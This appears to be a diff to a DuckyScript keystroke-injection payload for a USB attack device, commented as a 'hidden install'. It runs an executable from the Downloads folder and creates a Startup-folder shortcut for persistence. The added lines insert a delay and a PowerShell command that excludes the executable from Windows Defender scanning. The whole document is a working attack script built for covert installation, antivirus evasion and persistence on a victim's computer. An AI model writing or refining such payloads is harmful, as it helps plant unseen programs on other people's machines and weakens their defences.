@@ -1,5 +1,6 @@
 REM Hidden install of python exe
 DEFAULT_DELAY 200
+DELAY 1500
 
 REM open terminal
 GUI r
@@ -18,6 +19,13 @@ ENTER
 DELAY 500
 STRING cd $env:USERPROFILE\Downloads
 ENTER
+
+DELAY 250
+REM Make it exclusion
+STRING Add-MpPreference -ExclusionPath "C:\Path\To\Your\main.exe"
+ENTER
+
+
 DELAY 250
 STRING ./main.exe
 ENTER
@@ -25,3 +33,4 @@ ENTER
 REM Add to startup REMOVE FOR TESTING
 STRING $sc="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\MyApp.lnk";$tg="$env:USERPROFILE\Downloads\main.exe";$sh=New-Object -ComObject WScript.Shell;$s=$sh.CreateShortcut($sc);$s.TargetPath=$tg;$s.Save()
 ENTER
+
